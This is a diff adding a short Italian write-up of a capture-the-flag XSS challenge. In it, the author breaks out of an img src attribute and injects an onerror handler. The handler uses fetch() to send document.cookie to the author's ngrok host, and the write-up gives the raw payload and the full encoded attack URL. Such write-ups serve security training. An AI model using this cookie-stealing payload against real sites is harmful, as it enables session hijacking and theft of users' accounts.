@@ -1,0 +1,13 @@
+In questa challenge, la differenza è che qualsiasi cosa mando al form con submit query,
+lui me lo converte in un tag img.
+Quindi l'idea è creare un evento javascript dentro il tag img in modo tale che
+quando l'immagine viene caricata, fa qualcosa.
+Ora dato che in questo caso non viene caricata, creiamo un evento onerror 
+e ci mettiamo lo stesso comando di XSS1, quello della fetch, senza il tag script.
+Quindi il comando che mandiamo al form è il seguente:
+. " onerror = 'fetch("https://unuseable-nada-noncaustically.ngrok-free.dev?=" + document.cookie)' "
+Il . " è per farsì che il tag src sia chiuso.
+Come prima, mi salvo l'url, metto in ascolto il mio server ngrok e faccio la richiesta con il report url. 
+L'url è il seguente:
+http://xss2.challs.cyberchallenge.it/?html=.+%22+onerror+%3D+%27fetch%28%22https%3A%2F%2Funuseable-nada-noncaustically.ngrok-free.dev%3F%3D%22+%2B+document.cookie%29%27+%22
+
